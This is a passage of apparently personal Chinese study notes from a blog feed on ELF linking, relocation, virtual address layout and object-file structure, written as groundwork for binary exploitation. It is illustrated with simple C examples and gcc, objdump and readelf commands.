这两个目标文件链接成一个可执行文件002linking03，可执行文件的入口点是<code>main</code>函数（运行程序时，<code>main</code>函数会被首先执行）。</p><p>2.-m elf_i386：指定了链接器的目标架构为32位的x86架构</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711141344927.png" alt="image-20230711141344927"></p><h3 id="4、静态链接以后多出4个字节"><a href="#4、静态链接以后多出4个字节" class="headerlink" title="4、静态链接以后多出4个字节"></a>4、静态链接以后多出4个字节</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711142353390.png" alt="image-20230711142353390"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711143043203.png" alt="image-20230711143043203"></p><h4 id="查看002linking-o-text段描述-objdump-S"><a href="#查看002linking-o-text段描述-objdump-S" class="headerlink" title="查看002linking.o    text段描述(objdump -S )"></a>查看002linking.o    text段描述(objdump -S )</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204453642.png" alt="image-20230711204453642"></p><h4 id="002linking02-o文件"><a href="#002linking02-o文件" class="headerlink" title="002linking02.o文件"></a>002linking02.o文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204555890.png" alt="image-20230711204555890"></p><h4 id="002linking03文件"><a href="#002linking03文件" class="headerlink" title="002linking03文件"></a>002linking03文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204630037.png" alt="image-20230711204630037"></p><h2 id="二、空间与地址分配"><a href="#二、空间与地址分配" class="headerlink" title="二、空间与地址分配"></a>二、空间与地址分配</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712002022380.png" alt="image-20230712002022380"></p><p>32位的Linux系统，程序的虚拟地址空间通常从0x08048000开始。这是因为Linux内核默认将用户空间程序的基地址（也就是.text段的加载地址）设置为0x08048000。这个地址是在内核源代码中硬编码的。</p><h2 id="三、重定位"><a href="#三、重定位" class="headerlink" title="三、重定位"></a>三、重定位</h2><p>1.上面使用 <strong>ld</strong> 链接器将把两个.o文件链接在一起以创建一个可执行文件时，链接器会<strong>自动处理全局符号</strong>重定位。</p><p>2.链接器首先会读取所有输入的目标文件，并收集所有的符号定义和引用。这些信息存储在符号表中。</p><p>3.然后，链接器会解决所有的符号引用。对于每个引用，链接器会查找对应的符号定义，然后计算出该符号在最终可执行文件中的地址。</p><p>4.最后，链接器会更新所有需要重定位的地址引用。这些引用的位置和方式存储在重定位表中。对于表中的每个条目，链接器会根据符号的最终地址和重定位类型，更新对该符号的引用。</p><h3 id="1、重定位效果：objdump-d-分别查看反汇编结果"><a href="#1、重定位效果：objdump-d-分别查看反汇编结果" class="headerlink" title="1、重定位效果：objdump -d 分别查看反汇编结果"></a>1、重定位效果：objdump -d 分别查看反汇编结果</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712105715702.png" alt="image-20230712105715702"></p><h3 id="2、重定位表"><a href="#2、重定位表" class="headerlink" title="2、重定位表"></a>2、重定位表</h3><p>1、链接器要知道哪些指令要被调整，需要给链接器一个清单，这个清单就是重定位表</p><p>2、重定位表一般是ELF文件的一个段，如.text段重定位表就是rel.text,data段的重定位表就是rel.data</p><h4 id="使用objdump-r-a-o可以看到重定位表"><a href="#使用objdump-r-a-o可以看到重定位表" class="headerlink" title="使用objdump -r a.o可以看到重定位表"></a>使用objdump -r a.o可以看到重定位表</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712113952650.png" alt="image-20230712113952650"></p><p><strong>十六进制寻址：</strong>在”00000028”中，最右边的位是8，它是第0位，所以你将8乘以16的0次方得到8*1=8。</p><p>然后，向左移动一位，你有2，这是第1位，所以你将2乘以16的1次方得到2*16=32。</p><h2 id="四、链接的符号解析功能"><a href="#四、链接的符号解析功能" class="headerlink" title="四、链接的符号解析功能"></a>四、链接的符号解析功能</h2><p>1、a.c在生成目标文件的时候，并没有定义share变量和swap函数，但是在没有链接之前，gcc也不能说这两</p><p>个引用不存在，那么怎么确定是外部引用的符号，还是源代码手滑写错了的符号呢？</p><p>2、那就是用链接器在全局符号表中查找，能找到就进行修正虚拟地址，找不到肯定不能链接通过，因为调</p><p>用了不存在的引用</p><h3 id="1、objdump-s"><a href="#1、objdump-s" class="headerlink" title="1、objdump  -s"></a>1、objdump  -s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712132412141.png" alt="image-20230712132412141"></p><h2 id="五、静态库链接"><a href="#五、静态库链接" class="headerlink" title="五、静态库链接"></a>五、静态库链接</h2><p>静态库</p><p>目前理解就是一个运行调用的 库而已</p><h2 id="六、进程虚拟地址空间"><a href="#六、进程虚拟地址空间" class="headerlink" title="六、进程虚拟地址空间"></a>六、进程虚拟地址空间</h2><p>1、32位操作系统的最大寻址范围位4GB</p><p>2、64位操作系统的最大寻址范围围位17 179 869 184 GB，即2的64次方 = 16EiB，通常而言，操作系统虚</p><p>拟地址空间无需这么大的空间，于是通常设定64位操作系统的虚拟地址寻址空间大小是<strong>48位</strong>，也就是<strong>2的48</strong></p><p><strong>次方</strong> = 256TB</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712164945449.png" alt="image-20230712164945449"></p><h4 id="1-采用十六进制转化位十进制寻址："><a href="#1-采用十六进制转化位十进制寻址：" class="headerlink" title="1.采用十六进制转化位十进制寻址："></a>1.采用十六进制转化位十进制寻址：</h4><p>0xC0000000=<strong>12 * 16^7 + 0 * 16^6 + 0 * 16^5 + 0 * 16^4 + 0 * 16^3 + 0 * 16^2 + 0 * 16^1 + 0 * 16^0</strong>= 3221225472</p><p>0xFFFFFFFF=4,294,967,295=4GB</p><p>0xFFFFFFFF-0xC0000000=1GB</p><h4 id="补充：十六进制转化为2进制"><a href="#补充：十六进制转化为2进制" class="headerlink" title="补充：十六进制转化为2进制"></a>补充：十六进制转化为2进制</h4><p>因为16等于2的4次方，所以每个十六进制数字都可以用4个二进制位来表示。</p><p>例如，如果我们要将F（十六进制中的15）转换为二进制，我们可以这样做：</p><ol><li>首先，我们知道F在十六进制中代表15。</li><li>然后，我们可以将15转换为二进制。这可以通过以下步骤完成：<ul><li>15除以2等于7余1，所以最低位是1。</li><li>7除以2等于3余1，所以下一位是1。</li><li>3除以2等于1余1，所以下一位是1。</li><li>1除以2等于0余1，所以最高位是1。</li></ul></li><li>因此，15在二进制中表示为1111。</li></ol><h2 id="七、装载方式"><a href="#七、装载方式" class="headerlink" title="七、装载方式"></a>七、装载方式</h2><p>和前面计算机基础中的分页技术差不多</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712170412317.png" alt="image-20230712170412317"></p><h2 id="八、覆盖装入"><a href="#八、覆盖装入" class="headerlink" title="八、覆盖装入"></a>八、覆盖装入</h2><p> 原理：目前处理谁的数据就让谁坐在处理的位置上 </p><p>医生看病原理：病人A问诊后被医生叫去拍片，病人B问诊后拍片…，直到病人A拿到片子回来后其他病人停</p><p>止问诊，医生给病人A看片，病人A就是覆盖装入</p><h2 id="九、页映射"><a href="#九、页映射" class="headerlink" title="九、页映射"></a>九、页映射</h2><p>1、页映射不是一下子把程序的所有数据和指令都装入内存</p><p>2、而是将内存和磁盘中所有的数据和指令按照页（page）为单位划分成若干个页</p><p>3、目前常见的页大小为4096字节，也就是4KB，1KB的数据也是交换4KB，交换的就是4KB的倍数</p><h2 id="十、进程虚拟空间分布"><a href="#十、进程虚拟空间分布" class="headerlink" title="十、进程虚拟空间分布"></a>十、进程虚拟空间分布</h2><p>1、合并<strong>相同权限</strong>的段（Section）到同一个节（Segment）</p><p>2、对于相同权限的段，把它们合并到一起当作一个节（Segment）进行映射</p><p>3、节（Segment）装载的角度<strong>重新划分</strong>了ELF的各个段</p><p>之前段已经划分好了，接下来就是划分节了</p><p><strong>如：</strong>滴滴打车，每个人至少叫一 辆车（不可能半辆），相当于ElF文件执行程序至少需要一个页，如果有20个人</p><p>去5个小区，每人一辆车就浪费了，如果按照相同属性划分（同一个小区的为一类）节，就可以只要5辆车，</p><p>利用资源。   合并加载便于页映射，减少出现<strong>1KB</strong>的数据也是交换<strong>4KB</strong>的情况，利用资源</p><p>1、<strong>Section</strong>和<strong>Segment</strong>是对ElF文件描述的两种视图</p><p>2、<strong>Section</strong>偏向于静态链接（链接视图Linking View）</p><p>3、<strong>Segment</strong>偏向于<strong>动态转载</strong>（执行视图Execution View）</p><h3 id="1、例子C源码00204-c"><a href="#1、例子C源码00204-c" class="headerlink" title="1、例子C源码00204.c"></a>1、例子C源码00204.c</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;char*flag ="CTFDU-YU{flag_is_here}";int main(){ printf("%s",flag); return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-静态编译-gcc-static-00204-c-m32-o-00204"><a href="#2-静态编译-gcc-static-00204-c-m32-o-00204" class="headerlink" title="2.静态编译  gcc -static 00204.c -m32 -o 00204"></a>2.静态编译  gcc -static 00204.c -m32 -o 00204</h4><p>生成静态链接可执行文件</p><p>readelf -S text2 查看段信息，readlelf -l text2 查看节信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713003655633.png" alt="image-20230713003655633"></p><ul><li>Type：段的类型。例如，LOAD 表示该段应加载到内存中，NOTE 表示该段包含辅助信息，GNU_STACK 表示该段包含堆栈信息，等等。</li><li>Offset：该段在文件中的偏移量。</li><li>VirtAddr：该段在内存中的虚拟地址（程序入口）</li><li>PhysAddr：该段在内存中的物理地址。对于可执行和共享对象文件，此字段通常被忽略。</li><li>FileSiz：该段在文件中的大小。</li><li>MemSiz：该段在内存中的大小。</li><li>Flg：该段的标志。R 表示可读，W 表示可写，E 表示可执行。</li><li>Align：该段在文件和内存中的对齐</li></ul><p>Section to Segement mapping 中写清楚了那些段映射到了哪些节</p><p>LOAD类型说明是需要映射的，其他不需要映射</p><p>上图就是相同权限的段合并到同一个节中</p><p>前两节通过Flg段得知：</p><p>00 可读可执行 可以看到里面有.text .rodata段</p><p>01 可读可写 可以看到里面有.data段</p><p>Align：字节对齐</p><p>1000h=4kb，所以两个节分别映射到两个页中</p><h2 id="十一、程序表头"><a href="#十一、程序表头" class="headerlink" title="十一、程序表头"></a>十一、程序表头</h2><p>1.ElF可执行文件中有一个专门的数据结构叫程序头表（Program Header Table），用来保存Segment信息</p><p>2.程序头表（Program Header Table）：这部分主要用于程序的加载。它描述了一系列的段（Segment），每个段包含了一些在程序执行时需要加载到内存中的信息。例如，代码段（.text）包含了程序的机器代码，数据段（.data）包含了程序的全局变量等。</p><p>3。无论是静态编译还是动态编译，只要生成了 ELF 格式的可执行文件，就会有程序头表。静态编译和动态编译的主要区别在于，静态编译会将所有的库函数都直接链接到可执行文件中，而动态编译则会在运行时动态链接库函数。这会影响到 ELF 文件的大小和复杂性，但并不会影响到程序头表的存在。</p><p>4.ELF (Executable and Linkable Format) 文件有三种主要类型：可重定位的文件（Relocatable file）、可执行文件（Executable file）和共享对象文件（Shared object file）。</p><ul><li>可重定位的文件（通常是编译器输出的目标文件，扩展名通常为 .o）只包含代码和数据，它们需要通过链接器（linker）与其他目标文件或库文件链接在一起，生成可执行文件或共享对象文件。因为这些文件不需要被直接执行，所以它们通常不包含程序头表（Program Header Table），只包含节头表（Section Header Table）。</li><li>可执行文件和共享对象文件（通常是动态链接库，Linux下扩展名通常为 .so）是需要被装载到内存中执行的，所以它们包含程序头表。程序头表描述了如何将文件的内容加载到内存中以供执行。</li></ul><p>注：共享库是动态库，和静态库有很大区别，每个使用静态库的程序都有一份静态库的副本。</p><h4 id="readelf-h-查看elf文件头信息"><a href="#readelf-h-查看elf文件头信息" class="headerlink" title="readelf -h 查看elf文件头信息"></a>readelf -h 查看elf文件头信息</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713021258414.png" alt="image-20230713021258414"></p><h2 id="十二、堆和栈"><a href="#十二、堆和栈" class="headerlink" title="十二、堆和栈"></a>十二、堆和栈</h2><p>1、虚拟空间地址（VMA）对进程的地址空间进行管理</p><p>2、程序直线所用的栈（Stack）、堆（Heap）空间的表现由VMA来控制</p><p>3、使用/proc可以看到VMA地址和堆栈的映射</p><h3 id="1、例子：-00205-c"><a href="#1、例子：-00205-c" class="headerlink" title="1、例子：    00205.c"></a>1、例子：    00205.c</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char* flag = "ctfshow{flag_is_here}";int main(){ while(1){ sleep(1); printf("%s",flag); fflush(stdout); } return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-gcc-o-00205-2-00205-c-转化为可执行文件"><a href="#1-gcc-o-00205-2-00205-c-转化为可执行文件" class="headerlink" title="1.gcc -o 00205-2 00205.c 转化为可执行文件"></a>1.gcc -o 00205-2 00205.c 转化为可执行文件</h4><h4 id="2-运行00205-2"><a href="#2-运行00205-2" class="headerlink" title="2.运行00205-2"></a>2.运行00205-2</h4><h4 id="3-ps-aux-grep-00205-2获取PID"><a href="#3-ps-aux-grep-00205-2获取PID" class="headerlink" title="3.ps aux | grep 00205-2获取PID"></a>3.ps aux | grep 00205-2获取PID</h4><h4 id="4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射"><a href="#4-cat-x2F-proc-x2F-33983-x2F-maps-看程序-进程的内存的详细映射" class="headerlink" title="4.cat /proc/33983/maps  看程序 进程的内存的详细映射"></a>4.cat /proc/33983/maps  看程序 进程的内存的详细映射</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034048625.png" alt="image-20230713034048625"></p><h3 id="2、进程的VMA区域"><a href="#2、进程的VMA区域" class="headerlink" title="2、进程的VMA区域"></a>2、进程的VMA区域</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/002-1.jpg" alt="002-1"></p><h3 id="3、进程栈初始化"><a href="#3、进程栈初始化" class="headerlink" title="3、进程栈初始化"></a>3、进程栈初始化</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713034926454.png" alt="image-20230713034926454"></p><h3 id="4、栈空间"><a href="#4、栈空间" class="headerlink" title="4、栈空间"></a>4、栈空间</h3><p>栈空间（Stack Space）是计算机内存中的一种区域，主要用于存储程序运行时的临时数据，如函数调用时的参数、返回地址以及局部变量等。栈空间的特 点是后进先出（LIFO，Last In First Out），即最后进入栈的数据会被最先取出。</p><p>在程序运行时，每当有函数调用发生，系统会在栈空间中为这个函数分配一块区域，这块区域被称为”栈帧”（Stack Frame）。栈帧中存储了这个函数的局部变量、参数以及返回地址等信息。当函数执行完毕后，对应的栈帧就会被销毁，释放其占用的栈空间。</p><p>栈空间的大小通常是有限的。如果程序在运行过程中超出了栈空间的大小限制，就会发生”栈溢出”（Stack Overflow）错误。这通常是由于递归调用过深或者局部变量过多导致的。</p><p>总的来说，栈空间是程序运行时存储临时数据的重要区域，它的管理方式决定了函数调用的工作方式以及程序的运行效率。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713035715924.png" alt="image-20230713035715924"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713041716448.png" alt="image-20230713041716448"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;链接（LINKING）&quot;&gt;&lt;a href=&quot;#链接（LINKING）&quot; class=&quot;headerlink&quot; title=&quot;链接（LINKING）&quot;&gt;&lt;/a&gt;链接（LINKING）&lt;/h1&gt;&lt;h2 id=&quot;一、静态链接&quot;&gt;&lt;a href=&quot;#一、静态链接&quot; cla</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门课程" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>编译与目标文件结构</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-study02.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-study02.html</id>
    <published>2023-07-13T06:38:47.000Z</published>
    <updated>2023-07-13T06:46:43.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编译和目标文件结构"><a href="#编译和目标文件结构" class="headerlink" title="编译和目标文件结构"></a><strong>编译和目标文件结构</strong></h1><h2 id="一、编译"><a href="#一、编译" class="headerlink" title="一、编译"></a>一、编译</h2><p>（GCC）编译环境</p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c" class="headerlink" title="1、root@ubuntu ~/3/pwn# gcc hello.c"></a>1、root@ubuntu ~/3/pwn# gcc hello.c</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-12.jpg" alt="001-12"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-6.jpg" alt="001-6"></p><h2 id="1、预编译"><a href="#1、预编译" class="headerlink" title="1、预编译"></a>1、预编译</h2><p>、</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-7.jpg" alt="001-7"></p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i"></a>1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-9.jpg" alt="001-9"></p><h2 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h2><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s"></a>1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-8.jpg" alt="001-8"></p><h3 id="2、编译器原理"><a href="#2、编译器原理" class="headerlink" title="2、编译器原理"></a>2、编译器原理</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-10.jpg" alt="001-10"></p><h3 id="3、汇编器"><a href="#3、汇编器" class="headerlink" title="3、汇编器"></a>3、汇编器</h3><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o"></a>1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-11.jpg" alt="001-11"></p><h2 id="二、目标文件格式"><a href="#二、目标文件格式" class="headerlink" title="二、目标文件格式"></a>二、目标文件格式</h2><h3 id="objdump-常用工具"><a href="#objdump-常用工具" class="headerlink" title="objdump(常用工具)"></a>objdump(常用工具)</h3><p><strong><code>objdump</code>查看内存或文件中的数据时，这些工具通常会以十六进制的形式显示数据，因为十六进制比二进制更紧凑，而且比八进制和十进制更容易转换为二进制。</strong></p><p><strong><code>objdump -h</code>命令用于显示二进制文件的节头信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172305384.png" alt="image-20230709172305384"></p><ol><li><p>.text段 ：保存编译后的机器指令</p></li><li><p>.data段：保存全局变量和局部静态变量的数据  </p></li><li><p>.bss段：保存未初始化的全局变量和未初始化的局部静态变量</p></li><li><p>.comment：注释段                                                                                                                                                                      <strong>注：</strong><code>.comment</code>段是ELF文件中的一个可选段，通常包含了一些元数据，如编译器版本信息、操作系统版本信息、链接器版本信息等。这些信息对于程序的执行没有影响，但可能对调试、分析或理解二进制文件的来源和构建过程有帮助。</p></li><li><p>.note.GNU-stack:堆栈提示段    </p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172053432.png" alt="image-20230709172053432"></p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172825881.png"></p></li><li><p>root@ubuntu~/3/pwn# gcc -c SimpleSection.c -m32  #生成一个32位的文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库，这样我们就可以使用printf函数了int global_init_var = 84; // 定义并初始化一个全局变量global_init_var，初始值为84int global_uninit_var; // 定义一个全局变量global_uninit_var，未指定初始值，它会被自动初始化为0// 定义一个函数func1，它接受一个整数参数ivoid func1(int i) {    printf("%d\n", i); // 打印参数i的值}// 定义主函数main，它是程序的入口点int main(void) {    static int static_var1 = 85; // 在函数内部定义并初始化一个静态变量static_var1，初始值为85    static int static_var2; // 在函数内部定义一个静态变量static_var2，未指定初始值，它会被自动初始化为0    int a = 1; // 在函数内部定义并初始化一个局部变量a，初始值为1    func1(static_var1 + static_var2 + a); // 调用函数func1，参数为static_var1、static_var2和a的和    return a; // main函数返回a的值，也就是1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在再查看一下文件</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709175505000.png" alt="image-20230709175505000"></p><p><strong>注：.rodata段表示只读段</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-13.jpg" alt="001-13"></h2><h3 id="查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o"><a href="#查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o" class="headerlink" title="查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o"></a>查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-15.jpg" alt="001-15"></h3><p>二进制代码段</p><p>汇编结果</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-16.jpg" alt="001-16"></p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709203945016.png" alt="image-20230709203945016"></p><p>因为是16进制，所以两个字符占用一个字节</p><p>右到左指的是字节</p><p><strong>在编程中，我们通常会根据变量的初始化方式来推断它的进制</strong>：如果一个数值前面没有任何前缀，并且只包含0-9的数字，那么我们通常认为它是一个十进制数。如果一个数值前面有<code>0x</code>或<code>0X</code>前缀，那么我们认为它是一个十六进制数。如果一个数值前面有<code>0b</code>或<code>0B</code>前缀，那么我们认为它是一个二进制数。如果一个数值前面有<code>0</code>前缀，那么我们认为它是一个八进制数。</p><h3 id="rodata段"><a href="#rodata段" class="headerlink" title="rodata段"></a>rodata段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709214554282.png" alt="image-20230709214554282"></h3><h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709215216928.png" alt="image-20230709215216928"></h3><h3 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-19.jpg" alt="001-19"></h3><p>目标程序编译程序时自定义段不能是.开头</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709220506695.png" alt="image-20230709220506695"></p><h3 id="elf文件结构描述"><a href="#elf文件结构描述" class="headerlink" title="elf文件结构描述"></a>elf文件结构描述</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-20.jpg" alt="001-20"></p><h3 id="elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）"><a href="#elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）" class="headerlink" title="elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）"></a>elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709230802832.png" alt="image-20230709230802832"></p><p><strong>魔数</strong>：第一个字节表示<strong>delete</strong>，后面三个字节分别是<strong>e 、l 、 f</strong> 的<strong>ASCII</strong>值</p><p><strong>注：</strong>当操作系统加载一个可执行文件时，它会检查这个魔数来确定文件的格式，以便知道如何处理这个文件。如果这个魔数不是正确，那么操作系统不会按照ELF文件的方式来处理</p><p>魔数后的<strong>第五个字节01</strong>代表的<strong>32位</strong>，<strong>02</strong>代表<strong>64位</strong>，00代表是<strong>无效文件</strong> </p><p><strong>第六个字节01</strong>代表的是<strong>字节序</strong>，规定elf文件的<strong>大端小端（现在简单理解为存储顺序）</strong></p><p><strong>第七个字节01</strong>代表<strong>版本号<em>（一般固定为1）</em></strong></p><p>后面<strong>9个字节</strong>是<strong>扩展字节</strong>，<strong>没有定义</strong>，编译器可以加入自己的字节</p><p> <strong>“Start of sections headers”（节头开始）</strong>指的是ELF文件中<strong>节头表</strong>（Section Header Table）的起始位置。节头表是ELF文件中存储了各个节（Sections）信息的数据结构。每个节都包含了特定类型的数据，如代码、数据、符号表等。</p><h3 id="elf文件段表"><a href="#elf文件段表" class="headerlink" title="elf文件段表"></a>elf文件段表<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709231031674.png" alt="image-20230709231031674"></h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709233939056.png" alt="image-20230709233939056"></p><p><strong>注：</strong>如果一个段表是由40个0组成，那么它是由40个字节的值为0的连续内存组成的，每个0表示一个字节！！！(必须都为0才行)</p><p><strong>偏移地址</strong>：1092+15x40（15表示第十五个段）</p><h4 id="段描述："><a href="#段描述：" class="headerlink" title="段描述："></a>段描述：</h4><p>段名索引：<strong>11</strong>表示接下来11个字节用来<strong>储存段的名字</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710224448799.png" alt="image-20230710224448799"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710003604077.png" alt="image-20230710003604077"></p><h2 id="三、目标文件格式分析实践"><a href="#三、目标文件格式分析实践" class="headerlink" title="三、目标文件格式分析实践"></a>三、目标文件格式分析实践</h2><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1.touch 创建文件</p><p>2.ls一下</p><p>3.用vim编译器打开文件</p><p>4.敲代码</p><p>5.gcc -c study001.c -m32          ：1.-c选项表示只进行编译而不进行链接   2.编译C语言<strong>源文件</strong>并生成<strong>目标文件</strong></p><p>6.ls查看**.o**文件生成</p><p>7.查看study001.o文件发现是乱码、</p><p>8.objdump -h study001.o 查看目标文件头部信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711102005789.png" alt="image-20230711102005789"></p><h3 id="4-编译文件"><a href="#4-编译文件" class="headerlink" title="4.编译文件"></a>4.编译文件</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710234254606.png" alt="image-20230710234254606"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库int global_int_84; // 定义一个全局变量，名为 global_int_84，但没有初始化，应该有一个初始值，例如 int global_int_84 = 84;int global_uninit_var; // 定义一个未初始化的全局变量，名为 global_uninit_var，默认值为 0void funcl(int i){ // 定义一个函数，名为 funcl，它接受一个整数参数        printf("%d\n",i); // 在控制台上打印参数 i 的值，然后换行}int main(){ // 定义主函数，程序的执行从这里开始        static int static_var = 85; // 定义一个静态局部变量，名为 static_var，初始值为 85        static int static_var2; // 定义一个未初始化的静态局部变量，名为 static_var2，默认值为 0        int a=1; // 定义一个局部变量，名为 a，初始值为 1        int b; // 定义一个未初始化的局部变量，名为 b，其初始值是未定义的        funcl(static_var+static_var2+a+b); // 调用 funcl 函数，参数为 static_var、static_var2、a 和 b 的和        return a; // 主函数返回 a 的值，即 1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按Esc键退出编辑，输入“  ：wq   ” 然后回车</p><p>9.readelf -h study001.o 打开目标文件的<strong>elf头部信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711000106572.png" alt="image-20230711000106572"></p><p>section header string table index: 14</p><p>段表最后一行40个字节是段表名称的<strong>字符串</strong>所在的<strong>段</strong>的信息</p><h3 id="od-study001-o查看文件-amp-用010分析文件"><a href="#od-study001-o查看文件-amp-用010分析文件" class="headerlink" title="od study001.o查看文件&amp;用010分析文件"></a>od study001.o查看文件&amp;用010分析文件</h3><p>od（octal 